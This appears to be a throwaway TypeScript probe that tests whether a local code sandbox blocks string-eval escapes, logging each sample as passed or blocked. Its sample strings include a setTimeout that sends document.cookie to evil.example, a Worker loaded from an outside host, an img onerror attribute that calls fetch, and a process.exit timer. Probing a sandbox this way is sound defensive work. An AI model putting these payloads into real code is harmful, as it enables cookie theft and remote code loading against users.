// Throwaway probe — DELETE after use. Part 3: sandbox string-eval escapes.
import { runGenerated } from "./src/lib/sandbox.ts";

const probe = (label: string, src: string) => {
  const res = runGenerated(src);
  console.log(`${res.ok ? "PASSED" : "BLOCKED"} ${label} — ${res.detail}`);
};

probe(
  "setTimeout string-eval with fetch",
  `const JOBS = ["a"];
function test_no_skip() {}
setTimeout("fetch('//evil.example/steal?c='+document.cookie)", 1);`,
);
probe(
  "setInterval string-eval",
  `const JOBS = ["a"];
function test_no_skip() {}
setInterval("process.exit(1)", 1000);`,
);
probe(
  "new Worker construction",
  `const JOBS = ["a"];
function test_no_skip() {}
var w = new Worker("https://evil.example/w.js");`,
);
probe(
  "document.createElement onerror attr",
  `const JOBS = ["a"];
function test_no_skip() {}
var el = document.createElement("img"); el.setAttribute("onerror", "fetch('//evil')");`,
);
probe(
  "benign function-arg timer",
  `const JOBS = ["a"];
function test_no_skip() {}
setTimeout(function () { var x = 1; }, 5);`,
);
